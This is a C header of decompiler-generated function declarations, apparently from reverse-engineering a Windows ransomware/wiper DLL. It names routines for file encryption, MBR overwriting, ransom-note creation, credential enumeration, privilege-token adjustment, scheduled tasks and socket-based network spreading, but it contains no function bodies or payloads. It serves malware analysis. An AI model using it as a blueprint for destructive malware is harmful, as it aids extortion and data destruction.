#pragma once

#include "defs.h"
#include <windows.h>


// Function declarations

#define __thiscall __cdecl // Test compile in C mode

LPVOID __stdcall CreateHeap(SIZE_T dwBytes);
void __stdcall FreeHeap(LPVOID lpMem);
int __stdcall GetSystemVolumes(void *); // idb
int __stdcall CreateSomeFiles(LPCSTR lpFileName, int); // idb
int __stdcall CreateFileSetFP(LPCSTR lpFileName, void *Dst); // idb
															 // int __userpurge CheckIfFileExists@<eax>(int a1@<eax>, LPCSTR lpFileName, LPCVOID lpBuffer);
int __stdcall CryptoAcquireContext(BYTE *pbBuffer, DWORD dwLen); // idb
int RunCryptWriteMBR();
HANDLE __stdcall WriteFileMapping(LPCWSTR lpFileName, int a2);
void __stdcall EnumerateFiles(LPCWSTR pszDir, int a2, int a3);
// BOOL __usercall CryptoGenerateKey@<eax>(int a1@<eax>);
BOOL __stdcall ImportPubKey(int a1);
// HLOCAL __usercall CryptoExportKey@<eax>(int a1@<eax>);
HLOCAL __stdcall GenerateReadMeMessage(LPCWSTR pszDir);
DWORD __stdcall CryptoCleanUp(LPVOID lpThreadParameter); // idb
signed int CheckDriveAndPubKey();
bool __stdcall GetHeapAndMoveData(void *a1, size_t a2, void *Src, size_t Size, void *a5, size_t a6, int a7, int a8, void *a9, int a10, void *a11, int a12);
// int __usercall SockCloseConnection@<eax>(SOCKET *a1@<eax>);
BOOL __stdcall Dummy_StackSettup(__int64 a1);
signed int CheckIfTimePassed();
// BOOL __usercall GetAndFreeHeap@<eax>(BOOL *a1@<esi>);
// signed int __userpurge Unk_FindResourceAndIterate@<eax>(int a1@<esi>, __m64 mm0_0@<mm0>, __m64 mm1_0@<mm1>, _DWORD *a2, int a3, char a4);
// char __userpurge Unk_SockChecks@<al>(int a1@<eax>, unsigned __int16 a2);
// int __userpurge SockreceivData@<eax>(__int16 *a1@<esi>, SOCKET s, char a3, char a4);
_WORD *__stdcall Unk_SetIpAddress(__int16 a1, char a2, __int16 a3, __int16 a4, __int16 a5, __int16 a6, __int16 a7, __int16 a8);
LPVOID __fastcall sub_73C224D0(int a1, _WORD *a2, void *Src);
// _WORD *__userpurge sub_73C22547@<eax>(_WORD *a1@<eax>, __int16 a2, __int16 a3, __int16 a4, __int16 a5, _WORD *a6);
_BYTE *__stdcall Unk_ReturnByteArrayOfUnk_Exe(__int16 a1, __int16 a2, __int16 a3, __int16 a4, __int16 a5, _WORD *a6);
// _BYTE *__userpurge ProcessHeaps_1@<eax>(_WORD *a1@<eax>, __int16 a2, __int16 a3, __int16 a4, _WORD *a5);
// LPVOID __userpurge CreateHeapAndMalloc@<eax>(_WORD *a1@<ecx>, unsigned __int16 a2@<di>, void *Src, char a4, __int16 a5, __int16 a6);
// _WORD *__userpurge sub_73C228B5@<eax>(char a1@<al>, __int16 a2, __int16 a3, __int16 a4, __int16 a5, BOOL a6, void *Src, _WORD *a8);
// _BYTE *__userpurge sub_73C229CE@<eax>(_WORD *a1@<eax>, __int16 a2, __int16 a3, __int16 a4, _WORD *a5);
// LPVOID __userpurge sub_73C22ADF@<eax>(_WORD *a1@<eax>, __int16 a2@<dx>, __int16 a3@<cx>, char a4, char a5);
void *__fastcall sub_73C22C1E(__int16 cx0, __int16 dx0, int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, void *Src);
LPVOID __thiscall sub_73C22CCF(void *a1, int a2, int a3, void *Src, int a5);
LPVOID __thiscall sub_73C22D82(void *a1, char a2);
// LPVOID __userpurge sub_73C22E30@<eax>(_WORD *a1@<ebx>, unsigned __int16 a2@<di>, char a3, __int16 a4, void *Src);
// signed int __userpurge SockSendRecvDataFreeHeap@<eax>(SOCKET a1@<eax>, __int16 a2, LPVOID a3, int a4, _WORD *a5);
// signed int __userpurge SockProcessSendRecv_2@<eax>(SOCKET a1@<eax>, __int16 a2, __int16 a3, __int16 a4, _WORD *a5, LPVOID a6, char *a7, int a8, void *a9, _DWORD *a10, _WORD *a11);
// signed int __userpurge sub_73C23061@<eax>(SOCKET a1@<eax>, __int16 a2, _WORD *a3, LPVOID a4, int a5, char *a6);
int __stdcall SocketUseSocket1(SOCKET s, int, int, int, int, int); // idb
int __stdcall SocketUseSocket2(SOCKET s, int, int, int, int, int); // idb
int __stdcall sub_73C2330E(SOCKET s, int, int, int, int, int, int, int, void *Src, int, int, int, int); // idb
int __stdcall sub_73C23469(SOCKET s, int, int, int, int, int, void *, void *Src, int); // idb
																					   // signed int __userpurge sub_73C235FA@<eax>(SOCKET a1@<eax>, __int16 a2@<dx>, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, __int16 a11);
																					   // signed int __userpurge sub_73C2369D@<eax>(SOCKET a1@<eax>, __int16 a2, __int16 a3, LPVOID a4, int a5, char *a6);
int __stdcall SockProcessSendRecv(SOCKET s, int, int, int, int, int, int, void *Src); // idb
																					  // int __userpurge sub_73C23863@<eax>(unsigned __int16 a1@<ax>, SOCKET s, int a3, int a4, int a5, int a6, int a7, BOOL a8, BOOL a9, void *Src);
																					  // int __userpurge sub_73C23986@<eax>(unsigned __int16 a1@<ax>, SOCKET s, int a3, int a4, int a5, int a6, int a7, void *a8, int a9, void *Src, int a11, int a12, int a13);
int __stdcall sub_73C23B5D(SOCKET s, int, int, int, int, int); // idb
int __stdcall sub_73C23C0A(SOCKET s, int, int, int, int, int); // idb
															   // signed int __userpurge sub_73C23CA0@<eax>(char a1@<al>, SOCKET a2);
int __stdcall CreateAndGetHeap(SOCKET s, int, int, int, int, int, int, int, int, int, int, int); // idb
																								 // int __userpurge sub_73C23EC8@<eax>(char *a1@<eax>, SOCKET s, int a3, int a4, int a5, int a6, int a7, int a8);
																								 // int __userpurge sub_73C2407B@<eax>(_WORD *a1@<edi>, SOCKET s, int a3, int a4, int a5, int a6, int a7);
int __stdcall sub_73C242DF(SOCKET s, int, int, int, int, int, int); // idb
																	// signed int __userpurge sub_73C24820@<eax>(void *a1@<eax>, SOCKET s, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10);
																	// int __userpurge sub_73C2489C@<eax>(_WORD *a1@<eax>, _WORD *a2@<ecx>, SOCKET s, int a4, int a5, int a6, __int16 a7);
int __stdcall sub_73C24AFE(SOCKET s, int, int, int, int, int, int, void *Src, int, int, int, int); // idb
int __stdcall sub_73C24BA1(SOCKET s, int, int, int, int, int); // idb
															   // signed int __userpurge sub_73C24C1C@<eax>(int a1@<eax>, SOCKET s, int a3, int a4, int a5, int a6, int a7, int a8, __int64 a9, unsigned __int16 a10, _DWORD *a11, _WORD *a12);
															   // signed int __userpurge sub_73C24FB3@<eax>(int a1@<edx>, int a2@<esi>, __int64 a3);
															   // signed int __userpurge sub_73C2501B@<eax>(int a1@<eax>, int a2@<ecx>, __int64 a3);
signed int __stdcall sub_73C250E0(SOCKET a1, int a2, int a3, int a4, int a5, int a6, __int64 a7, unsigned __int16 a8);
// signed int __userpurge sub_73C251F3@<eax>(int a1@<edi>, SOCKET a2, int a3, int a4, int a5, int a6);
// signed int __userpurge sub_73C25333@<eax>(int a1@<ebx>, SOCKET s, int a3, int a4, int a5, int a6, int a7, void *Src);
int __stdcall SocketUseSockets(int, SOCKET s, int, int, int, int, int); // idb
																		// int __userpurge sub_73C25A7E@<eax>(__m64 a1@<mm0>, __m64 a2@<mm1>, int a3, char *cp, u_short hostshort, int a6, int a7, int a8, int a9, int a10, int a11, int a12);
																		// int __userpurge sub_73C2668A@<eax>(__m64 a1@<mm0>, __m64 a2@<mm1>, char *cp, int a4, int a5, int a6, int a7, int a8, int a9);
																		// int __userpurge SocketCreateAndConnect@<eax>(unsigned __int8 *a1@<ebx>, int a2, char *cp, u_short hostshort);
																		// int __userpurge SockGetData@<eax>(char **a1@<ebx>, __int16 *a2@<esi>, SOCKET s, char a4, int a5);
																		// int __userpurge SockSendBuffer@<eax>(SOCKET a1@<ebx>, char *buf, int len);
int __stdcall ConvertHeapMToWBytes(LPCSTR lpMultiByteStr); // idb
DWORD ReturnTimeIfTimePassed();
// signed int __usercall CheckUsrArgs@<eax>(int a1@<eax>);
int __stdcall CheckCmdLineArgs(LPCWSTR lpCmdLine); // idb
int GeneratePath();
int __stdcall sub_73C26BB0(_WORD *a1);
signed int __stdcall CompareStringsW_2(int a1, int a2, int a3);
void __stdcall CleanUpHeaps_3(int a1);
int __stdcall CleanUpHeaps_2(void *Src, void *); // idb
int __stdcall CleanUpHeaps(void *Src, void *, int); // idb
int __stdcall CompareStringsW(int a1, int a2, int a3);
// int __userpurge LaunchCrit3@<eax>(int a1@<ebx>, struct _RTL_CRITICAL_SECTION *a2@<esi>, __int16 *a3);
_DWORD *__thiscall SomeHeapCleanupFunct(struct _RTL_CRITICAL_SECTION *a1, __int16 *a2);
int __stdcall EnumProcessHeap(LPVOID lpMem); // idb
int __thiscall CheckCritSection(void *a1, struct _RTL_CRITICAL_SECTION *a2, int *a3);
// int __userpurge sub_73C26FC7@<eax>(char *a1@<eax>, int a2@<esi>, struct _RTL_CRITICAL_SECTION *lpCriticalSection);
// void __usercall EnterAndLeaveCritSection_5(int a1@<esi>);
struct _RTL_CRITICAL_SECTION *__stdcall sub_73C27091(LONG a1, ULONG_PTR a2, _RTL_CRITICAL_SECTION_DEBUG *a3, LONG a4);
// signed int __usercall EnterAndLeaveCritSection_4@<eax>(int a1@<esi>);
// _DWORD *__userpurge GetHeapAndFreeIt@<eax>(struct _RTL_CRITICAL_SECTION *a1@<esi>, int a2, _DWORD *a3);
// signed int __userpurge EnterAndLeaveCritSection_3@<eax>(int a1@<ebx>, struct _RTL_CRITICAL_SECTION *a2@<esi>, _DWORD *a3);
// int __userpurge EnterAndLeaveCritSection_2@<eax>(unsigned int a1@<eax>, int a2@<esi>, int a3, _DWORD *a4);
// int __userpurge EnterAndLeaveCritSection@<eax>(struct _RTL_CRITICAL_SECTION *a1@<eax>, int *a2@<ebx>, int a3);
int __stdcall EnumerateProcessHeap(LPCRITICAL_SECTION lpCriticalSection, void *Src, int); // idb
																						  // signed int __userpurge CreateFileAndWrite@<eax>(const WCHAR *a1@<ebx>, LPCWSTR lpFileName, LPCVOID lpBuffer);
DWORD __stdcall StartAddress(LPVOID lpThreadParameter); // idb
														// int __usercall Enum64BitProcessAndComPipes@<eax>(__m64 a1@<mm0>, __m64 a2@<mm1>);
int __stdcall EnumNetIPProtocols(int a1);
int __stdcall EnumNetIpServices(int a1);
LPCWSTR __stdcall EnumNetServers(int a1, DWORD servertype, LPCWSTR domain);
int __stdcall EnumNetResources(int, LPNETRESOURCEW lpNetResource); // idb
int __stdcall EnumerateWindowsCredentials(int a1);
void __stdcall  GetPhysicalNetBiosAndWait(LPVOID lpThreadParameter);
bool __stdcall CompareMemoryAllocs(const void *a1, const void *a2, unsigned int a3);
void PerformPrivChecks();
BOOL __stdcall DllEntryPoint(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved);
DWORD __stdcall SetThreadParam(LPVOID lpThreadParameter); // idb
														  // signed int __userpurge SelfLocalHostCheck@<eax>(__m64 mm0_0@<mm0>, __m64 a2@<mm1>, const unsigned __int16 *a1);
														  // void __usercall __noreturn perfc_1(__m64 a1@<mm0>, __m64 a2@<mm1>, int a3, DWORD dwErrCode, HANDLE Thread, HANDLE hThread);
int __stdcall CheckPrivsAdjustTokens(LPCWSTR lpName); // idb
signed int FreeNetApiBuffer();
unsigned int *__stdcall GetNetServerInfo(int *a1, unsigned int *a2, unsigned int *a3, int *a4);
int __stdcall PathCombineWithCWindows(LPWSTR pszDest); // idb
int SomeFileCheck();
// BOOL __userpurge LaunchCMDProcess@<eax>(int a1@<eax>, int a2);
signed int GetversionInfo();
int CreateScheduledTaskAsAdmin();
// int __userpurge sub_73C285D0@<eax>(void **a1@<ebx>, __m64 mm0_0@<mm0>, __m64 a3@<mm1>, int a2, HRSRC hResInfo);
int EnumerateProcesses();
unsigned int __stdcall EnumerateProcessesAndTokens(int a1);
// signed int __userpurge CreateSomeFile_2@<eax>(DWORD a1@<ebx>, const WCHAR *lpFileName, LPCVOID lpBuffer, DWORD NumberOfBytesWritten);
// signed int __userpurge GetDllHostData@<eax>(__m64 mm0_0@<mm0>, __m64 a2@<mm1>, int a1);
signed int CreateSomeFile();
signed int __stdcall FindFileByName(int a1);
signed int CheckSecurityAuthorityAndTokens();
signed int EnumPhysDriv0();
int SetLockAtCDir();
DWORD __stdcall Unk_ConvertIPAddress(LPVOID lpThreadParameter); // idb
DWORD __stdcall GetNetworkInterfaces(LPVOID lpThreadParameter); // idb
int __stdcall EnumerateHostNameAndIP_2(int a1);
signed int __thiscall sub_73C291FA(int a1, int a2);
// int __userpurge CheckImageVProtect@<eax>(int a1@<esi>, LPVOID lpAddress);
unsigned int __thiscall sub_73C29322(int a1, unsigned int a2);
int LoadSomeLibraries();
// int __userpurge CleanUp@<eax>(__m64 a1@<mm0>, __m64 a2@<mm1>, int a3, DWORD dwErrCode, HANDLE Thread, HANDLE hThread);
int __stdcall SetVirtualAttributes(int a1, int a2, int a3);
int __stdcall EnumerateHostNameAndIP(char *name); // idb
												  // int __userpurge SetWideAddress@<eax>(__m64 a1@<mm0>, __m64 a2@<mm1>, LPCWSTR lpWideCharStr, int a4, int a5);
												  // int __userpurge AcceptEulaAndLaunch@<eax>(WCHAR *a1@<ecx>, WCHAR *a2@<ebx>, int a3);
												  // signed int __userpurge InitRemoteLaunch@<eax>(WCHAR *a1@<ecx>, WCHAR *a2@<esi>, int a3, int a4, int a5);
int __stdcall CheckUACPathsAndLaunchProcess(int, LPCWSTR lpUserName, LPCWSTR lpPassword, int); // idb
																							   // int __userpurge sub_73C29DC3@<eax>(__m64 a1@<mm0>, __m64 a2@<mm1>, LPCWSTR lpWideCharStr);
																							   // int __userpurge sub_73C29E05@<eax>(struct _RTL_CRITICAL_SECTION *eax0@<eax>, int a1);
DWORD __stdcall LaunchChecksForAdminPaths(LPVOID lpThreadParameter); // idb
int __stdcall CreateAndHandleThread(int a1, int a2);
DWORD __stdcall sub_73C29F8E(LPVOID lpThreadParameter); // idb
DWORD __stdcall sub_73C2A073(LPVOID lpThreadParameter); // idb
DWORD __stdcall sub_73C2A0FE(LPVOID lpThreadParameter); // idb
														// DWORD __userpurge SleepAndFreeHeap@<eax>(__m64 a1@<mm0>, __m64 a2@<mm1>, LPVOID lpThreadParameter);
int __stdcall SockSendDataWithTimeOut(int, u_short hostshort); // idb
signed int __stdcall CheckIfDataWasSent(int a1);
// void *__cdecl memcpy(void *Dst, const void *Src, size_t Size);
// void __cdecl free(void *Memory);
// void *__cdecl malloc(size_t Size);
// char *__cdecl itoa(int Val, char *DstBuf, int Radix);
// void *__cdecl memset(void *Dst, int Val, size_t Size);
// void *__usercall _alloca_probe@<eax>(unsigned int a1@<eax>, int a2@<ecx>);
// signed int __userpurge SomeVersionCheck@<eax>(__m64 mm0_0@<mm0>, __m64 mm1_0@<mm1>, int a1, int *a2, int a3, int a4);
int __cdecl InsertCharsIntoBuffer(int a1);
// signed int __userpurge SomeCompressionFunct@<eax>(__m64 a1@<mm0>, __m64 a2@<mm1>, int a3, int a4);
signed int __stdcall sub_73C2BA60(int a1);
signed int __stdcall sub_73C2BAA4(int a1, signed int a2, _BYTE *a3, int a4);
signed int __stdcall sub_73C2BB31(int a1, _BYTE *a2, int a3);
signed int __stdcall sub_73C2BB48(int a1, signed int a2);
signed int __stdcall sub_73C2BBBF(int a1);
signed int __stdcall sub_73C2BBEA(int a1);
int __cdecl sub_73C2BC5B(int, int, size_t Size); // idb
unsigned int __stdcall sub_73C2BD21(unsigned int a1, _BYTE *a2, unsigned int a3);
int __stdcall sub_73C2BF51(int a1, int a2, int a3);
int __cdecl sub_73C2BF73(int a1, _BYTE *a2, unsigned int a3);
void *__cdecl ReturnMultipliedMalloc(int Unused, int X, int Y); // idb
void __cdecl FreeMemPtr(int unused, void *Memory); // idb
signed int __cdecl sub_73C2C244(int a1, int a2, unsigned int a3, _DWORD **a4, unsigned int *a5, _WORD *a6);
// int __usercall sub_73C2C6D0@<eax>(__m64 a1@<mm0>, __m64 a2@<mm1>, int a3, int a4);
// BOOL __stdcall CryptGenRandom(HCRYPTPROV hProv, DWORD dwLen, BYTE *pbBuffer);
// BOOL __stdcall CryptAcquireContextA(HCRYPTPROV *phProv, LPCSTR szContainer, LPCSTR szProvider, DWORD dwProvType, DWORD dwFlags);
// BOOL __stdcall CryptExportKey(HCRYPTKEY hKey, HCRYPTKEY hExpKey, DWORD dwBlobType, DWORD dwFlags, BYTE *pbData, DWORD *pdwDataLen);
// BOOL __stdcall CryptAcquireContextW(HCRYPTPROV *phProv, LPCWSTR szContainer, LPCWSTR szProvider, DWORD dwProvType, DWORD dwFlags);
// BOOL __stdcall CreateProcessAsUserW(HANDLE hToken, LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
// BOOL __stdcall InitiateSystemShutdownExW(LPWSTR lpMachineName, LPWSTR lpMessage, DWORD dwTimeout, BOOL bForceAppsClosed, BOOL bRebootAfterShutdown, DWORD dwReason);
// BOOL __stdcall DuplicateTokenEx(HANDLE hExistingToken, DWORD dwDesiredAccess, LPSECURITY_ATTRIBUTES lpTokenAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, TOKEN_TYPE TokenType, PHANDLE phNewToken);
// BOOL __stdcall SetTokenInformation(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength);
// BOOL __stdcall GetTokenInformation(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength, PDWORD ReturnLength);
// PUCHAR __stdcall GetSidSubAuthorityCount(PSID pSid);
// BOOL __stdcall OpenThreadToken(HANDLE ThreadHandle, DWORD DesiredAccess, BOOL OpenAsSelf, PHANDLE TokenHandle);
// PDWORD __stdcall GetSidSubAuthority(PSID pSid, DWORD nSubAuthority);
// BOOL __stdcall AdjustTokenPrivileges(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength);
// BOOL __stdcall LookupPrivilegeValueW(LPCWSTR lpSystemName, LPCWSTR lpName, PLUID lpLuid);
// BOOL __stdcall OpenProcessToken(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
// BOOL __stdcall SetThreadToken(PHANDLE Thread, HANDLE Token);
// int __stdcall CredEnumerateW(_DWORD, _DWORD, _DWORD, _DWORD); weak
// int __stdcall CredFree(_DWORD); weak
// BOOL __stdcall SetSecurityDescriptorDacl(PSECURITY_DESCRIPTOR pSecurityDescriptor, BOOL bDaclPresent, PACL pDacl, BOOL bDaclDefaulted);
// BOOL __stdcall InitializeSecurityDescriptor(PSECURITY_DESCRIPTOR pSecurityDescriptor, DWORD dwRevision);
// BOOL __stdcall CryptDestroyKey(HCRYPTKEY hKey);
// BOOL __stdcall CryptGenKey(HCRYPTPROV hProv, ALG_ID Algid, DWORD dwFlags, HCRYPTKEY *phKey);
// BOOL __stdcall CryptEncrypt(HCRYPTKEY hKey, HCRYPTHASH hHash, BOOL Final, DWORD dwFlags, BYTE *pbData, DWORD *pdwDataLen, DWORD dwBufLen);
// BOOL __stdcall CryptImportKey(HCRYPTPROV hProv, const BYTE *pbData, DWORD dwDataLen, HCRYPTKEY hPubKey, DWORD dwFlags, HCRYPTKEY *phKey);
// BOOL __stdcall CryptSetKeyParam(HCRYPTKEY hKey, DWORD dwParam, const BYTE *pbData, DWORD dwFlags);
// BOOL __stdcall CryptReleaseContext(HCRYPTPROV hProv, DWORD dwFlags);
// BOOL __stdcall CryptStringToBinaryW(LPCWSTR pszString, DWORD cchString, DWORD dwFlags, BYTE *pbBinary, DWORD *pcbBinary, DWORD *pdwSkip, DWORD *pdwFlags);
// BOOL __stdcall CryptBinaryToStringW(const BYTE *pbBinary, DWORD cbBinary, DWORD dwFlags, LPWSTR pszString, DWORD *pcchString);
// BOOL __stdcall CryptDecodeObjectEx(DWORD dwCertEncodingType, LPCSTR lpszStructType, const BYTE *pbEncoded, DWORD cbEncoded, DWORD dwFlags, PCRYPT_DECODE_PARA pDecodePara, void *pvStructInfo, DWORD *pcbStructInfo);
// DWORD __stdcall DhcpEnumSubnetClients(WCHAR *ServerIpAddress, DHCP_IP_ADDRESS SubnetAddress, DHCP_RESUME_HANDLE *ResumeHandle, DWORD PreferredMaximum, LPDHCP_CLIENT_INFO_ARRAY *ClientInfo, DWORD *ClientsRead, DWORD *ClientsTotal);
// void __stdcall DhcpRpcFreeMemory(PVOID BufferPointer);
// DWORD __stdcall DhcpGetSubnetInfo(WCHAR *ServerIpAddress, DHCP_IP_ADDRESS SubnetAddress, LPDHCP_SUBNET_INFO *SubnetInfo);
// DWORD __stdcall DhcpEnumSubnets(WCHAR *ServerIpAddress, DHCP_RESUME_HANDLE *ResumeHandle, DWORD PreferredMaximum, LPDHCP_IP_ARRAY *EnumInfo, DWORD *ElementsRead, DWORD *ElementsTotal);
// ULONG __stdcall GetIpNetTable(PMIB_IPNETTABLE IpNetTable, PULONG SizePointer, BOOL Order);
// ULONG __stdcall GetAdaptersInfo(PIP_ADAPTER_INFO AdapterInfo, PULONG SizePointer);
// BOOL __stdcall ConnectNamedPipe(HANDLE hNamedPipe, LPOVERLAPPED lpOverlapped);
// HMODULE __stdcall GetModuleHandleW(LPCWSTR lpModuleName);
// HANDLE __stdcall CreateNamedPipeW(LPCWSTR lpName, DWORD dwOpenMode, DWORD dwPipeMode, DWORD nMaxInstances, DWORD nOutBufferSize, DWORD nInBufferSize, DWORD nDefaultTimeOut, LPSECURITY_ATTRIBUTES lpSecurityAttributes);
// BOOL __stdcall TerminateThread(HANDLE hThread, DWORD dwExitCode);
// BOOL __stdcall DisconnectNamedPipe(HANDLE hNamedPipe);
// BOOL __stdcall FlushFileBuffers(HANDLE hFile);
// DWORD __stdcall GetTempPathW(DWORD nBufferLength, LPWSTR lpBuffer);
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
// BOOL __stdcall DeleteFileW(LPCWSTR lpFileName);
// BOOL __stdcall FreeLibrary(HMODULE hLibModule);
// HGLOBAL __stdcall GlobalAlloc(UINT uFlags, SIZE_T dwBytes);
// HMODULE __stdcall LoadLibraryW(LPCWSTR lpLibFileName);
// BOOL __stdcall GetComputerNameExW(COMPUTER_NAME_FORMAT NameType, LPWSTR lpBuffer, LPDWORD nSize);
// HGLOBAL __stdcall GlobalFree(HGLOBAL hMem);
// void __stdcall __noreturn ExitProcess(UINT uExitCode);
// BOOL __stdcall GetVersionExW(LPOSVERSIONINFOW lpVersionInformation);
// DWORD __stdcall GetModuleFileNameW(HMODULE hModule, LPWSTR lpFilename, DWORD nSize);
// BOOL __stdcall DisableThreadLibraryCalls(HMODULE hLibModule);
// DWORD __stdcall ResumeThread(HANDLE hThread);
// DWORD __stdcall GetEnvironmentVariableW(LPCWSTR lpName, LPWSTR lpBuffer, DWORD nSize);
// DWORD __stdcall GetFileSize(HANDLE hFile, LPDWORD lpFileSizeHigh);
// DWORD __stdcall SetFilePointer(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod);
// void __stdcall SetLastError(DWORD dwErrCode);
// HGLOBAL __stdcall LoadResource(HMODULE hModule, HRSRC hResInfo);
// HANDLE __stdcall GetCurrentThread();
// HANDLE __stdcall OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
// UINT __stdcall GetSystemDirectoryW(LPWSTR lpBuffer, UINT uSize);
// DWORD __stdcall SizeofResource(HMODULE hModule, HRSRC hResInfo);
// void __stdcall GetLocalTime(LPSYSTEMTIME lpSystemTime);
// BOOL __stdcall Process32FirstW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
// LPVOID __stdcall LockResource(HGLOBAL hResData);
// BOOL __stdcall Process32NextW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
// HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName);
// LPWSTR __stdcall lstrcatW(LPWSTR lpString1, LPCWSTR lpString2);
// HANDLE __stdcall CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
// HANDLE __stdcall GetCurrentProcess();
// BOOL __stdcall VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
// LPVOID __stdcall VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// HMODULE __stdcall LoadLibraryA(LPCSTR lpLibFileName);
// BOOL __stdcall VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// int __stdcall WideCharToMultiByte(UINT CodePage, DWORD dwFlags, LPCWSTR lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCSTR lpDefaultChar, LPBOOL lpUsedDefaultChar);
// BOOL __stdcall GetExitCodeProcess(HANDLE hProcess, LPDWORD lpExitCode);
// DWORD __stdcall WaitForMultipleObjects(DWORD nCount, const HANDLE *lpHandles, BOOL bWaitAll, DWORD dwMilliseconds);
// BOOL __stdcall CreateProcessW(LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
// BOOL __stdcall PeekNamedPipe(HANDLE hNamedPipe, LPVOID lpBuffer, DWORD nBufferSize, LPDWORD lpBytesRead, LPDWORD lpTotalBytesAvail, LPDWORD lpBytesLeftThisMessage);
// UINT __stdcall GetTempFileNameW(LPCWSTR lpPathName, LPCWSTR lpPrefixString, UINT uUnique, LPWSTR lpTempFileName);
// LONG __stdcall InterlockedExchange(volatile LONG *Target, LONG Value);
// void __stdcall LeaveCriticalSection(LPCRITICAL_SECTION lpCriticalSection);
// int __stdcall MultiByteToWideChar(UINT CodePage, DWORD dwFlags, LPCSTR lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
// HANDLE __stdcall CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// DWORD __stdcall GetTickCount();
// HANDLE __stdcall CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
// HLOCAL __stdcall LocalFree(HLOCAL hMem);
// BOOL __stdcall FindNextFileW(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);
// HANDLE __stdcall CreateFileMappingW(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCWSTR lpName);
// HLOCAL __stdcall LocalAlloc(UINT uFlags, SIZE_T uBytes);
// BOOL __stdcall FindClose(HANDLE hFindFile);
// BOOL __stdcall GetFileSizeEx(HANDLE hFile, PLARGE_INTEGER lpFileSize);
// HANDLE __stdcall CreateFileW(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// void __stdcall Sleep(DWORD dwMilliseconds);
// BOOL __stdcall FlushViewOfFile(LPCVOID lpBaseAddress, SIZE_T dwNumberOfBytesToFlush);
// DWORD __stdcall GetLogicalDrives();
// DWORD __stdcall WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds);
// UINT __stdcall GetDriveTypeW(LPCWSTR lpRootPathName);
// BOOL __stdcall UnmapViewOfFile(LPCVOID lpBaseAddress);
// LPVOID __stdcall MapViewOfFile(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap);
// HANDLE __stdcall FindFirstFileW(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData);
// BOOL __stdcall CloseHandle(HANDLE hObject);
// BOOL __stdcall DeviceIoControl(HANDLE hDevice, DWORD dwIoControlCode, LPVOID lpInBuffer, DWORD nInBufferSize, LPVOID lpOutBuffer, DWORD nOutBufferSize, LPDWORD lpBytesReturned, LPOVERLAPPED lpOverlapped);
// DWORD __stdcall GetLastError();
// UINT __stdcall GetSystemDirectoryA(LPSTR lpBuffer, UINT uSize);
// BOOL __stdcall ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// BOOL __stdcall WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// HANDLE __stdcall GetProcessHeap();
// void __stdcall InitializeCriticalSection(LPCRITICAL_SECTION lpCriticalSection);
// LPVOID __stdcall HeapReAlloc(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem, SIZE_T dwBytes);
